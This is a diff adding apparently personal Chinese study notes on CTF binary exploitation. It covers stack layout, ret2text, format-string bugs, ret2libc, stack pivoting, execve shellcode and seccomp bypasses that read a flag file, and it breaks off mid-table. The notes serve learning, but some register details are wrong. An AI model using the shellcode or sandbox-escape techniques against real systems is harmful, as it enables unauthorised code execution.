+<p>call func&#x3D;push 下一条指令；</p>
+<p>​                jump func;</p>
+<p>ret 返回</p>
+<p>pop先从栈中拿取栈底的那个原本的下一条命令，之后就是直接运行这一条命令即可</p>
+<p>leave </p>
+<p>通常和ret一起执行</p>
+<p>ebp函数栈帧基指针，就固定在那里不会移动。</p>
+<p>leave &#x3D;&#x3D; mov esp,ebp;&#x2F;&#x2F;把栈顶恢复成原来的样子，清空函数局部变量空间。之后将原来的ebp还回去。</p>
+<p>xor</p>
+<p>异或运算相同为0，不同为1常常用来清空寄存器</p>
+<p>xor eax,eax;&#x3D;&#x3D;  eax&#x3D;eax所以为0；</p>
+<h2 id="32位和64位寄存器"><a href="#32位和64位寄存器" class="headerlink" title="32位和64位寄存器"></a>32位和64位寄存器</h2><h3 id="1-基本寄存器"><a href="#1-基本寄存器" class="headerlink" title="1.基本寄存器"></a>1.基本寄存器</h3><p>进行来了从32位到64位的转变，</p>
+<p>32位有8个寄存器</p>
+<img src="/pwn-notes/images/notes/image-20260413202248151.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260413202248151" style="zoom: 25%;" />
+
+<p><img src="/pwn-notes/images/notes/image-20260414225121242.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260414225121242"></p>
+<p>而64位寄存器就是在基本的32为又进行了拓展，扩展到了16个只不过就是将E变成了R，相关的用途基本上都是相同的，只不过又加了从R8~R15</p>
+<p>R8和R9是用来函数传参的，因为x64位寄存器传参需要传递6个参数：rdi rsi rsp rdp r8 r9</p>
+<p>r10和r11易失寄存器，就是函数在将数据存到寄存器中，然后再进行相应的函数运算，用完之后值不一定保留。</p>
+<p>r12~r15是用来长期保存数据的，非易失。</p>
+<h3 id="2-调用方式"><a href="#2-调用方式" class="headerlink" title="2.调用方式"></a>2.调用方式</h3><h4 id="32位的调用就是直接通过栈传递"><a href="#32位的调用就是直接通过栈传递" class="headerlink" title="32位的调用就是直接通过栈传递"></a>32位的调用就是直接通过栈传递</h4><p>function(int a,int b)</p>
+<p>如果是这样的话，那么首先从右向左将参数入栈（建立栈帧锚点push  edp;mov edp,esp;）</p>
+<p>call function调用函数</p>
+<p>传入参数时是从esp-8开始传的（因为首先esp是指向栈基edp的，之在调用函数时会将下面那一条命令压入栈底，此时esp-4）</p>
+<p>之后pop edp，将于原来的edp返回，之后ret，返回到一开始的下一条指令</p>
+<h4 id="64位寄存器调用寄存器传参"><a href="#64位寄存器调用寄存器传参" class="headerlink" title="64位寄存器调用寄存器传参"></a>64位寄存器调用寄存器传参</h4><p>需要使用6个参数，是固定的。</p>
+<h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>rdi rsi rdx rcx r8 r9,</p>
+<h5 id="基本传参"><a href="#基本传参" class="headerlink" title="基本传参"></a>基本传参</h5><p>rdi rsi rdx r10 r8 r9</p>
+<p>调用时就是自动去寄存器中去找数据，进行相应的运算。</p>
+<p>最后还是需要ret返回到一开始的下一条指令。</p>
+<h2 id="大小端序"><a href="#大小端序" class="headerlink" title="大小端序"></a>大小端序</h2><p>比如一个数据：0x12345678</p>
+<p>地址是从 0x100 0x101 0x102…..从低地址到高地址</p>
+<p>12 就是高字节， 78就是低字节</p>
+<h4 id="大端序"><a href="#大端序" class="headerlink" title="大端序"></a>大端序</h4><p>就是将高字节放进低地址</p>
+<p>就是将12放进0x100</p>
+<h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><p>高字节放进高地址，低字节放进低地址</p>
+<p>就是将78放进0x100,直到将12放进0x104中</p>
+<h2 id="页分配机制"><a href="#页分配机制" class="headerlink" title="页分配机制"></a>页分配机制</h2><p>linux中内存的划分：</p>
+<img src="/pwn-notes/images/notes/image-20260414165326655.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260414165326655" style="zoom:33%;" />
+
+
+
+
+
+<h4 id="页面分配机制是基于伙伴算法"><a href="#页面分配机制是基于伙伴算法" class="headerlink" title="页面分配机制是基于伙伴算法"></a>页面分配机制是基于伙伴算法</h4><h5 id="伙伴算法："><a href="#伙伴算法：" class="headerlink" title="伙伴算法："></a>伙伴算法：</h5><p>order是块的级别，order&#x3D;n,对应大小为2^n;也就是说内存将会被分为2^n块大小的页，一页就是4kb。</p>
+<p>但是如果一直的二分下去，就可能会造成内存碎片化：</p>
+<p>1.外部碎片：非伙伴关系，就是并不是从同一块大内存划分下来的，这就会造成一堆零散小内存块，并且不能合并。</p>
+<p>2.内部碎片：就是将一块大的内存块分配给小的内存需求，比如将8页的分给5页的，这样就会使得这一整个大的内存内部造成内部内存浪费。</p>
+<p>将相同的2^n串成一个链表；链表的好处就是存取方便。</p>
+<h5 id="虚拟地址物理地址"><a href="#虚拟地址物理地址" class="headerlink" title="虚拟地址物理地址"></a>虚拟地址物理地址</h5><p>物理地址：唯一的，真实的硬件地址</p>
+<p>虚拟地址;用户层面所能接触的，只是所划分的内存范围。</p>
+<p>而页表存在虚拟地址和物理地址的映射关系，虚拟地址可以通过映射关系找到物理地址。</p>
+<p>直到找到符合目标需求的内存大小，然后将会把那些是伙伴关系的串成链表。</p>
+<h2 id="栈结构"><a href="#栈结构" class="headerlink" title="栈结构"></a>栈结构</h2><p>栈就是临时存放数据的内存区域：</p>
+<p>数据后进先出 从高地址向低地址生长</p>
+<h3 id="ebp-esp-eip-rip"><a href="#ebp-esp-eip-rip" class="headerlink" title="ebp esp eip&#x2F;rip"></a>ebp esp eip&#x2F;rip</h3><p>ebp:栈基址，固定不动用来定位参数。</p>
+<p>esp：栈顶，push pop 会用到</p>
+<p>eip&#x2F;rip：指令指针</p>
+<h3 id="函数的调用过程"><a href="#函数的调用过程" class="headerlink" title="函数的调用过程"></a>函数的调用过程</h3><ol>
+<li><p>把参数压栈</p>
+</li>
+<li><p>call 函数</p>
+</li>
+</ol>
+<ul>
+<li><p>把下一条指令地址（返回地址）压栈</p>
+</li>
+<li><p>跳去函数</p>
+</li>
+</ul>
+<ol start="3">
+<li><p>函数开头： </p>
+<p>push edp;</p>
+<p>mov edp,esp;</p>
+</li>
+</ol>
+<p>建立新栈帧</p>
+<ol start="4">
+<li><p>函数运行，使用局部变量</p>
+</li>
+<li><p>函数结尾： </p>
+<p>leave;</p>
+<p>ret;</p>
+</li>
+</ol>
+<ul>
+<li>leave ：恢复 ebp、esp</li>
+<li>ret ：弹出栈顶 → 给 eip，回到调用处</li>
+</ul>
+<p>高地址</p>
+<p>函数参数（外部传进来的）</p>
+<p>call 压入的 返回地址</p>
+<p>旧 ebp（当前 ebp 指向这里）</p>
+<p>局部变量（开空间时往低地址长）(函数内部本来就存在的)（如果是向局部变量输入内容的话，就是从低地址向高地址输入，数组内部存放的顺序）</p>
+<p>低地址</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>首先根据栈的函数调用结构，知道栈的各个部分之后。并且局部变量所分配的内存大小是固定的，所以一旦输入的内容大于这个内存空间，就会覆盖上面的ebp 返回地址。</p>
+<p>局部变量在开空间的时候，是向低地址开的，可是如果是数组类型读取的话，就是从低地址向高地址存放。</p>
+<p>所以，如果超出这个内存，就会压到上面的其他地址。</p>
+<h3 id="检测步骤"><a href="#检测步骤" class="headerlink" title="检测步骤"></a>检测步骤</h3><p>首先检查栈溢出（gets strcpy）</p>
+<p>程序内部是否有后门参数。</p>
+<p>所以在传递参数时需要计算gets大小和edp的大小+后门函数的地址。</p>
+<h3 id="32位和64位eip-rip地址大小"><a href="#32位和64位eip-rip地址大小" class="headerlink" title="32位和64位eip&#x2F;rip地址大小"></a>32位和64位eip&#x2F;rip地址大小</h3><p>32位:4字节</p>
+<p>64位:8字节</p>
+<h2 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h2><p>64位栈地址必须是16的倍数，也就是地址最后四位是0；</p>
+<p>跳转到后门时，相当于执行一个新的函数，会需要rsp，一个程序中只有一个rsp。</p>
+<p>rip就是当前的指令行，ret时就是将返回地址弹进rip,从而执行指令。</p>
+<p>32位不强制要求栈对齐。</p>
+<h3 id="32-位：-填充-后门地址"><a href="#32-位：-填充-后门地址" class="headerlink" title="32 位： 填充 + 后门地址"></a>32 位： 填充 + 后门地址</h3><h3 id="64-位：-填充-ret-地址-后门地址"><a href="#64-位：-填充-ret-地址-后门地址" class="headerlink" title="64 位： 填充 + ret 地址 + 后门地址"></a>64 位： 填充 + ret 地址 + 后门地址</h3><h2 id="保护机制-nx-pie-canary"><a href="#保护机制-nx-pie-canary" class="headerlink" title="保护机制 nx,pie,canary"></a>保护机制 nx,pie,canary</h2><h3 id="1-canary-返回值前的随机数"><a href="#1-canary-返回值前的随机数" class="headerlink" title="1.canary(返回值前的随机数)"></a>1.canary(返回值前的随机数)</h3><p>作用：防止栈溢出覆盖返回值</p>
+<p>在返回地址前面加上一个随机数，函数退出后会检查这个数有没有改变，如果改变就会直接杀死程序。</p>
+<p>所以开这个保护，还想利用的话，就要首先泄露出这个随机数。</p>
+<h3 id="2-NX（把栈标记为不可执行）"><a href="#2-NX（把栈标记为不可执行）" class="headerlink" title="2.NX（把栈标记为不可执行）"></a>2.NX（把栈标记为不可执行）</h3><h3 id="3-PIE-程序的基地址每次都会发生变化"><a href="#3-PIE-程序的基地址每次都会发生变化" class="headerlink" title="3.PIE 程序的基地址每次都会发生变化"></a>3.PIE 程序的基地址每次都会发生变化</h3><p>所以如果想要获得后门代码，就先需要知道当前后门地址是什么。</p>
+<h2 id="格式化字符串漏洞-p-printf-s"><a href="#格式化字符串漏洞-p-printf-s" class="headerlink" title="格式化字符串漏洞 %p printf(s)"></a>格式化字符串漏洞 %p printf(s)</h2><p>输出的正确写法</p>
+<p>char buf[100];
+gets(buf);
+printf(“%s”, buf);  &#x2F;&#x2F; ✅ 把buf当字符串输出</p>
+<p>漏洞：</p>
+<p>char buf[100];
+gets(buf);
+printf(buf);        &#x2F;&#x2F; ❌ 直接把buf当【格式串】</p>
+<p>所以这个漏洞就是如果输入的内容中有%p %d %x %s等，就会将它们当做占位符，从而去栈上乱传数据。</p>
+<p>%p    32位占4字节   64位占8字节</p>
+<p>以“地址格式”输出栈上的一个值，带0x</p>
+<p>%x 读取16进制，不带0x</p>
+<p>%s  读取地址后将这个地址上的内容打印出来</p>
+<p>%n  写入已经输入字符个数，写入到目标内存 </p>
+<p>%hn写入已输出字符串个数两字节到目的地址</p>
+<p>%hhn写入已输出字符串个数一字节到目的地址</p>
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>printf()</p>
+<p>scanf()</p>
+<p>puts()</p>
+<p>22222222222222222222222222222222222222222222222222222222</p>
+<p>首先看一下在栈上的布局</p>
+<p><img src="/pwn-notes/images/notes/image-20260717190311647.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260717190311647"></p>
+<p>每一个栈上的布局都不同，所以，应该结合实际，我们可以通过%p来打印相关的地址，于是就可以找到我们输入的内容所在的位置，接着我们可以去找一些我们想要的地址，gdb算出到rdi的距离，这个就是到我们输出字符的距离，接着两者相加即可</p>
+<h2 id="syscall（初级）"><a href="#syscall（初级）" class="headerlink" title="syscall（初级）"></a>syscall（初级）</h2><p>系统内核指令调用  exceve需要三个参数，第一个参数放指令地址就行，其它0即可</p>
+<h3 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h3><p>首先在函数中，32位linux系统调用是  eax ebx ecx寄存器传参 的。</p>
+<p>而32位execve的调用号是11，所以eax&#x3D;11; 接下来就可执行命令将命令地址放入ebx中</p>
+<p>而再此还需要__asm来来告诉编译器，接下来是汇编指令</p>
+<p>__asm{int 0x80}，触发指令</p>
+<p>函数：从右向左传参</p>
+<p>系统：</p>
+<p>eax(存调用号)</p>
+<p>ebx-&gt;ecx-&gt;edx-&gt;edi-&gt;esi</p>
+<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>触发指令：syscall</p>
+<p>系统调用号寄存器：rax  59</p>
+<p>rax-&gt;rdi-&gt;rsi-&gt;rdx-&gt;r10-&gt;r8-&gt;r9</p>
+<p>函数调用：</p>
+<p>rdi-&gt;rsi-&gt;rdx-&gt;rcx-&gt;r8-&gt;r9</p>
+<h2 id="ret2libc：开起了nx保护，不能再执行栈里的函数"><a href="#ret2libc：开起了nx保护，不能再执行栈里的函数" class="headerlink" title="ret2libc：开起了nx保护，不能再执行栈里的函数"></a>ret2libc：开起了nx保护，不能再执行栈里的函数</h2><h3 id="libc"><a href="#libc" class="headerlink" title="libc:"></a>libc:</h3><p>linux中一个大的函数库</p>
+<p>包括了一些系统调用函数，执行命令。</p>
+<p>之前写的shellcode，可以直接放进栈中运行，但是开启之后就不能继续去运行，只能构造rop&#x2F;ret2libc。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h5 id="1-存在栈溢出漏洞，有gets-puts-strcpy"><a href="#1-存在栈溢出漏洞，有gets-puts-strcpy" class="headerlink" title="1.存在栈溢出漏洞，有gets()   puts()    strcpy()"></a>1.存在栈溢出漏洞，有gets()   puts()    strcpy()</h5><h5 id="2-开启了nx-dep保护"><a href="#2-开启了nx-dep保护" class="headerlink" title="2.开启了nx&#x2F;dep保护"></a>2.开启了nx&#x2F;dep保护</h5><p>相关的栈不可执行</p>
+<h5 id="3-能够控制的函数参数"><a href="#3-能够控制的函数参数" class="headerlink" title="3.能够控制的函数参数"></a>3.能够控制的函数参数</h5><p><img src="/pwn-notes/images/notes/image-20260722191820500.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260722191820500"></p>
+<p><img src="/pwn-notes/images/notes/image-20260722192005255.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260722192005255"></p>
+<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>初识：就是相关局部变量的地址到返回函数的内存大小不够放入那些rop链，于是就去一个新的bss栈去运行那些函数，来运行那些指令</p>
+<h3 id="限制条件函数-read-gets-函数的允许最大读取长度太短"><a href="#限制条件函数-read-gets-函数的允许最大读取长度太短" class="headerlink" title=".限制条件函数   read gets 函数的允许最大读取长度太短"></a>.限制条件函数   read gets 函数的允许最大读取长度太短</h3><h3 id="leave理解"><a href="#leave理解" class="headerlink" title="leave理解"></a>leave理解</h3><img src="/pwn-notes/images/notes/image-20260422163347692.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260422163347692" style="zoom:33%;" />
+
+<p>第一次总结：</p>
+<p>运用了两次leave ret 。每一次的leave ret 相当于，move esp ebp .此时栈顶和栈底都指向同一片区域，之后pop ebp就相当于将旧的ebp弹入到新的ebp中，之后esp就会向高地址移动，指向返回地址。此时再执行ret，就会把esp指向的返回地址压入eip中，进而执行返回命令。但是此时将原来的返回地址改成了leave ret 地址，于是还是会执行第二次leave ret ，但是第二次相当于已经迁入了另一个栈，看图中就是ebp下一个地址就是system函数的地址。之后再执行，还是将esp和ebp重合，pop ebp之后，esp就会指向system的地址，所以ret的时候，这个地址会直接弹进eip，也就是会被执行</p>
+<h3 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h3><p><a target="_blank" rel="noopener" href="https://yunpan.plus/t/12894-1-1">栈迁移实战：从栈溢出到ROP链的五种迁移路径（x86&#x2F;x64 + BUUCTF真题解析） - 云栈社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a></p>
+<p>本质就是采用了两次leave_ret,</p>
+<p>重要的就是，rbp：因为这个可以使的旧的rbp去往新的rbp，接着当rsp到达返回地址（leave_ret）rsp就会去往新的rbp,同时在ret时，pop rip这时rip就会执行当前rsp(s_addr+4)的命令，关键的还有迁移栈的构造。</p>
+<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>(下午碰见了于是记录一下)</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/resea/p/18881947#%E4%B8%89%E5%86%8D%E6%9D%A5%E4%B8%80%E4%B8%AA32%E4%BD%8Dshellcode">【Pwn深入学习】手写shellcode学习笔记 - 归海言诺 - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/16107">总结在 CTF-PWN 中遇到的 shellcode 利用-先知社区</a></p>
+<p>首先介绍一下什么是shellcode:机器语言，二进制机器码。作用就是机器执行完之后就可以拿到shell命令。</p>
+<h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>1.存在栈溢出，以便将shellcode能够写进能够执行的内存。</p>
+<p>2.NX关闭，以便内存可以执行</p>
+<p>3.知道 shellcode 的内存地址两种常见情况：</p>
+<ol>
+<li><p>栈地址固定 &#x2F; 可泄露</p>
+</li>
+<li><p>有 jmp esp &#x2F; call rsp 之类 gadget</p>
+</li>
+</ol>
+<ul>
+<li><p>32位： jmp esp </p>
+</li>
+<li><p>64位： jmp rsp</p>
+</li>
+</ul>
+<ol start="4">
+<li>没有强 ASLR + Canary 阻碍</li>
+</ol>
+<ul>
+<li><p>Canary 开启 → 无法覆盖返回地址</p>
+</li>
+<li><p>ASLR 开启 → 栈地址随机，不好跳</p>
+</li>
+</ul>
+<p>在python中可以自动生成，但是需要配置架构</p>
+<h3 id="1-python自动生成shellcodecode"><a href="#1-python自动生成shellcodecode" class="headerlink" title="1.python自动生成shellcodecode"></a>1.python自动生成shellcodecode</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+
+<h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>shellcode=asm(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+
+<p>之后就可以溢出到这个内存地址，进而去执行。但是要找好地址，传过去的时候不要找错了</p>
+<h3 id="2-写入用小端序64位"><a href="#2-写入用小端序64位" class="headerlink" title="2.写入用小端序64位"></a>2.写入用小端序64位</h3><p>因为cpu解析的时候需要根据小端序读取机器码。</p>
+<p>就是高字节放在高地址，小字节放在低地址。</p>
+<p>首先就是64位的，因为system函数需要三个参数，第一个rdi就需要放&#x2F;bin&#x2F;sh。之后两个为空，即使用xor清空为0即可。之后就是系统调用号，需要rax存储，</p>
+<p>mov rbx 0x68732f6e69622f</p>
+<p>push rbx 现在rbx存的字符串就在栈顶，并且栈顶指针正在指向它。</p>
+<p>mov rdi rsp 将栈顶也就是现在的字符串存入rdi第一个参数中</p>
+<p>xor rsi rsi</p>
+<p>xor rdx rdx 清空第2,3个参数</p>
+<p>mov rax 59</p>
+<p>syscall</p>
+<p><img src="/pwn-notes/images/notes/image-20260521103002737.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20260521103002737"></p>
+<h3 id="3-32位"><a href="#3-32位" class="headerlink" title="3.32位"></a>3.32位</h3><p>因为32位只有4字节所以要将指令分开写</p>
+<p>因为是&#x2F;bin&#x2F;sh</p>
+<p>因为是</p>
+<p>0x68732f2f —&gt; &#x2F;&#x2F;sh      </p>
+<p>0x6e69622f —&gt;&#x2F;bin</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">execve` 要求字符串参数必须以 <span class="hljs-literal">null</span> 结尾 <span class="hljs-string">\0</span><br></code></pre></td></tr></table></figure>
+
+<p>所以首先需要将eax异或为0,之后再压栈，在填入字符串。</p>
+<p>64位不需要这一步是因为，它是将字符串存入寄存器中，寄存器高字节天然就是0.</p>
+<p>之后</p>
+<p>xor ebx ebx </p>
+<p>xor ecx ecx</p>
+<p>mov eax 0xb</p>
+<p>int 0x80</p>
+<h3 id="4-绕过手法"><a href="#4-绕过手法" class="headerlink" title="4.绕过手法"></a>4.绕过手法</h3><h4 id="1-x00"><a href="#1-x00" class="headerlink" title="1.\x00"></a>1.\x00</h4><p>strcopy<code>、</code>strcmp<code>等二级字符串操作，</code>C语言用\x00截断字符串</p>
+<p>而\0出现的地方：</p>
+<ul>
+<li><code>/bin/sh</code> #&#x2F;bin&#x2F;sh 低位0</li>
+<li><code>mov rax, 0x3b;</code> # 0x3b 高位0</li>
+<li><code>mov eax, 0xb</code># 0xb 高位0</li>
+<li><code>int 0x80</code># 0x80 高位0以及80的本体0   但是在机器码中 只有80</li>
+</ul>
+<h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><h5 id="而面对64位的低位0我们就可以将-bin-sh-写成-bin-sh"><a href="#而面对64位的低位0我们就可以将-bin-sh-写成-bin-sh" class="headerlink" title="而面对64位的低位0我们就可以将  &#x2F;bin&#x2F;sh  写成  &#x2F;bin&#x2F;&#x2F;sh"></a>而面对64位的低位0我们就可以将  &#x2F;bin&#x2F;sh  写成  &#x2F;bin&#x2F;&#x2F;sh</h5><p>即 mov rbx  0x68732f2f6e69622f </p>
+<p>32位的本来就是\bin\sh没有\0</p>
+<h5 id="2使用低八位的al"><a href="#2使用低八位的al" class="headerlink" title="2使用低八位的al"></a>2使用低八位的al</h5><p>调用号：</p>
+<p>首先介绍寄存器的结构</p>
+<table>
+<thead>
+<tr>
+<th>位数</th>
+<th>寄存器名</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>64</td>
+<td>rax</td>
+<td>整个寄存器</td>
+</tr>
+<tr>
+<td>32</td>
+<td>eax</td>
+<td>低 32 位</td>
+</tr>
+<tr>
+<td>16</td>
+<td>ax</td>
+<td>低 16 位</td>
+</tr>
+<tr>
+<td>8</td>
+<td>al</td>
+<td>低 8 位</td>
+</tr>
+<tr>
+<td>8</td>
+<td>ah</td>
+<td>高 8 位（仅限 ax 的高 8 位）</td>
+</tr>
+</tbody></table>
+<p>这个时候就可以只需要</p>
+<p>rax 寄存器：
+┌────┬────┬────┬────┬────┬────┬────┬────┐
+│ 00      │ 00     │ 00       │ 00     │ 00      │ 00    │ 00        │ 3B │
+└────┴────┴────┴────┴────┴────┴────┴────┘
+ 高56位→                                                                         ←低8位&#x3D;0x3B</p>
+<p>我们写 <code>mov al, 0x3b</code> 而不写 <code>mov rax, 0x3b</code>，不是为了让高位0”消失”，而是为了：</p>
+<ul>
+<li><strong>避免机器码中出现 <code>0x00</code> 字节</strong></li>
+<li><strong>代码更短</strong></li>
+</ul>
+<p>实际上执行效果完全一样：最终 <code>rax = 59</code>。</p>
+<p>也就是说使用al之后就不会让高位的0写出来，机器码中就不会出现。</p>
+<h5 id="3-push-pop"><a href="#3-push-pop" class="headerlink" title="3  push+pop"></a>3  push+pop</h5><p>32位：push 0xb</p>
+<p>pop eax</p>
+<h5 id="4-nop对齐绕过"><a href="#4-nop对齐绕过" class="headerlink" title="4.nop对齐绕过"></a>4.nop对齐绕过</h5><p>如果需要字节对齐的话，就使用nop，因为它不起什么作用，单纯填充字节</p>
+<p>这样可以避免机器自动补0。</p>
+<h5 id="5-使用多步低位偏移进行字符串拼接"><a href="#5-使用多步低位偏移进行字符串拼接" class="headerlink" title="5.使用多步低位偏移进行字符串拼接"></a>5.使用多步低位偏移进行字符串拼接</h5><h3 id="5-沙箱保护"><a href="#5-沙箱保护" class="headerlink" title="5 沙箱保护"></a>5 沙箱保护</h3><h4 id="检测沙箱的工具-seccomp-tools"><a href="#检测沙箱的工具-seccomp-tools" class="headerlink" title="检测沙箱的工具   seccomp-tools"></a>检测沙箱的工具   seccomp-tools</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure>
+
+<h4 id="绕过方式-使用-shellcraft-前需要设置相关的架构"><a href="#绕过方式-使用-shellcraft-前需要设置相关的架构" class="headerlink" title="绕过方式     使用 shellcraft 前需要设置相关的架构"></a>绕过方式     使用 <code>shellcraft</code> 前需要设置相关的架构</h4><p>首先</p>
+<p>open函数会先去读取文件，并且得到文件描述符，这个文件描述符我们就可以通过这个数字进而去操作文件。</p>
+<p>因为这是一个函数，于是返回值会放到32位eax中，</p>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">shellcraft.<span class="hljs-title function_">read</span>(<span class="hljs-string">&#x27;eax&#x27;</span>, <span class="hljs-string">&#x27;esp&#x27;</span>, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这个相当于调用read函数，eax就是文件描述符，然后将栈顶指针作为临时缓存区，后面是大小</p>
+<h5 id="1-禁用execve绕过"><a href="#1-禁用execve绕过" class="headerlink" title="1.禁用execve绕过"></a>1.禁用execve绕过</h5><p>于是就使用orw，就是使用相关的函数，</p>
+<p>open:读取当前目录下的flag文件获得文件描述符</p>
+<p>read：将flag文件读取到内存中</p>
+<p>write：将flag从内存中打印出来</p>
+<h6 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode = asm(shellcode)<br></code></pre></td></tr></table></figure>
+
+<p>64位</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;</span><br>shellcode += shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>shellcode += shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode += shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x100</span>)<br>shellcode = asm(shellcode)<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-禁用open-read-write绕过"><a href="#2-禁用open-read-write绕过" class="headerlink" title="2.禁用open&#x2F;read&#x2F;write绕过"></a>2.禁用open&#x2F;read&#x2F;write绕过</h5><p>这时可以使用openat mmap senfile </p>
+<h4 id="openat-mmap-sendfile"><a href="#openat-mmap-sendfile" class="headerlink" title="openat + mmap + sendfile"></a>openat + mmap + sendfile</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">shellcode</span> = shellcraft.openat(<span class="hljs-number">0</span>,&#x27;/flag&#x27;,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.mmap(<span class="hljs-number">0</span>x10000,<span class="hljs-number">0</span>x100,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,&#x27;eax&#x27;,<span class="hljs-number">0</span>)<br><span class="hljs-attribute">shellcode</span> += shellcraft.sendfile(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x100)<br><span class="hljs-attribute">shellcode</span> = asm(shellcode)<br></code></pre></td></tr></table></figure>
+
+<p>openat还是首先打开文件</p>
+<ul>
+<li>**第一个参数 <code>0</code>**：<code>AT_FDCWD</code>，表示”从当前工作目录开始找文件”。如果填 <code>-100</code> 也是一样的效果。</li>
+<li><strong>第二个参数 <code>/flag</code><strong>：要打开的文件</strong>绝对路径</strong>，这里是从根目录开始找。</li>
+<li>**第三个参数 <code>0</code>**：<code>O_RDONLY</code>，只读模式。</li>
+</ul>
+<p>mmap</p>
+<p>建立内存映射，在得到文件描述符之后，就可以通过申请内存和内存大小，只读建立映射，从文件的第0个字节开始建立读取映射。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">值</th>
+<th align="left">含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">addr</td>
+<td align="left"><code>0x10000</code></td>
+<td align="left">建议内核把内存映射到这个地址</td>
+</tr>
+<tr>
+<td align="left">length</td>
+<td align="left"><code>0x100</code></td>
+<td align="left">映射 256 字节</td>
+</tr>
+<tr>
+<td align="left">prot</td>
+<td align="left"><code>1</code></td>
+<td align="left"><code>PROT_READ</code>，只读权限</td>
+</tr>
+<tr>
+<td align="left">flags</td>
+<td align="left"><code>1</code></td>
+<td align="left"><code>MAP_SHARED</code>，共享映射</td>
+</tr>
+<tr>
